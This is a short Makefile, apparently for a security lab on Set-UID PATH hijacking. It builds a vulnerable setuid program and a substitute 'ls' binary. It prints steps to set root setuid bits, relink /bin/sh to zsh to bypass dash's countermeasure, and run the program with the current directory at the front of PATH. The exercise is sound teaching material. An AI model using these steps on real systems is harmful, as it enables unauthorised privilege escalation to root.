.PHONY: all clean setup attack

all: vulnerable_ls malicious_ls

vulnerable_ls: vulnerable_ls.c
	gcc -o vulnerable_ls vulnerable_ls.c

malicious_ls: malicious_ls.c
	gcc -o ls malicious_ls.c

setup: vulnerable_ls
	@echo "To setup the attack:"
	@echo "1. Make vulnerable_ls a Set-UID program:"
	@echo "   sudo chown root vulnerable_ls"
	@echo "   sudo chmod 4755 vulnerable_ls"
	@echo ""
	@echo "2. Link /bin/sh to /bin/zsh (to bypass dash countermeasures):"
	@echo "   sudo ln -sf /bin/zsh /bin/sh"
	@echo ""
	@echo "3. Run the attack with:"
	@echo "   make attack"

attack: all
	@echo "Setting PATH to current directory..."
	@echo "Running vulnerable program..."
	@echo "Note: Run this after setting up Set-UID:"
	@echo "  export PATH=.:$$PATH && ./vulnerable_ls"

clean:
	rm -f vulnerable_ls ls
